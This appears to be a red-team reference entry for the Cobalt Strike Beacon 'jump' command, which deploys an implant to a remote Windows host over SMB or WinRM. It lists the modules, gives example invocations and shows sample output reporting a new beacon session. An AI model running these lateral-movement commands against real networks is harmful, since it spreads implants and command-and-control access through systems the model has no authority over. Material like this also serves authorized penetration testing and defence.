---
id: 924f29ef-ce23-417b-bbee-b26ce9347870
name: cobalt-strike-jump
type: command
executor: cobalt-strike
data: 'jump [module] [target] [listener]'
output: null
created_at: '2023-04-06T03:56:16.551355+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - Lateral-Movement
  - Beacon
verified: true
validated: true
---

# cobalt-strike-jump

## Command

```cobalt-strike
jump [module] [target] [listener]
```

## Description

The 'jump' command in Cobalt Strike's Beacon deploys a payload to a remote Windows host using specified remote execution modules. It is used for lateral movement by exploiting services like SMB (PsExec) or WinRM to install a new Beacon implant, establishing a child session for further operations.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| [module] | Execution method: psexec (x86 SMB service), psexec64 (x64 SMB), psexec_psh (x86 PowerShell via SMB), winrm (x86 WinRM PowerShell), winrm64 (x64 WinRM) | Yes |
| [target] | IP address or hostname of the remote system | Yes |
| [listener] | Name of the configured Cobalt Strike listener for the new Beacon | Yes |

## Examples

### Basic Usage

```cobalt-strike
jump psexec 192.168.1.100 http-listener
```

Deploys via PsExec to a target using an HTTP listener.

### Advanced Usage

```cobalt-strike
jump winrm64 target.domain.com https-beacon
```

Uses WinRM for a 64-bit target with an HTTPS listener for encrypted C2.

## Expected Output

Successful execution returns a new Beacon ID and session details, e.g.:

```
[*] Jumped to 192.168.1.100 (new beacon ID: 42)
[*] Service installed successfully
```

Failure might show: "[*] Access denied" or "[*] Connection timed out". Monitor the Cobalt Strike team server for new sessions.

## Related

- [[procedures/Cobalt-Strike-Lateral-Movement-via-Beacon-Remote-Exploits-and-Executes]]
- [[commands/cobalt-strike-remote-exec]]
